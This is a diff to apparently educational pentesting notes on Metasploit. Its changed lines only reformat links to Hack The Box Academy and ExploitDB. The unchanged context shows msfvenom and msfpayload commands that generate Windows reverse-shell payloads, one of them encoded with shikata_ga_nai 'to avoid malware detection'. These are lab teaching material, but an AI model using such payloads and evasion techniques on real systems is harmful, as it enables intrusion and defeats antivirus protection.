@@ -88,7 +88,7 @@ IPS/Scanners and virus.
 
 **Examples**:
 
-Example 1: using `msfvenom <msfvenom>`__ (without encoding)
+Example 1: using :ref:`msfvenom <msfvenom>` (without encoding)
 
 .. code-block:: console
 
@@ -96,7 +96,7 @@ Example 1: using `msfvenom <msfvenom>`__ (without encoding)
    Temen@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
 
 Example 2: (with
-`encoding <https://academy.hackthebox.com/module/39/section/418>`__)
+https://academy.hackthebox.com/module/39/section/418
 
 .. code-block:: console
 
@@ -109,7 +109,7 @@ Example 3: using msfpayload (used prior to 2015)
    Temen@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
 
 Example 4: Running the
-`encoder <https://academy.hackthebox.com/module/39/section/418>`__ on a
+encoder <https://academy.hackthebox.com/module/39/section/418> on a
 payload with 10 interations to avoid malware detection
 
 .. code-block:: console
@@ -140,8 +140,8 @@ ExploitDB
 ===========
 
 There is a list of exploits in the exploit database at
-`ExploitDB <https://www.exploit-db.com/>`__ If you filter for the tag
-`Metasploit Framework (MSF) <https://www.exploit-db.com/?tag=3>`__ you
+ExploitDB https://www.exploit-db.com/ If you filter for the tag
+Metasploit Framework (MSF) https://www.exploit-db.com/?tag=3 you
 will get a list of scripts that can be added to your Metasploit plugin
 directory.
 
